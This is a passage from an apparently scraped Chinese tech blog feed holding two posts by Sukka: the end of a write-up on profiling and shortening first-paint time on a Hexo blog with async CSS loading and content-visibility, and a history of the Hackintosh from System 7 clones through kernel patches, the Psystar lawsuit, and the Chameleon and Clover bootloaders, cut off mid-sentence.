class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 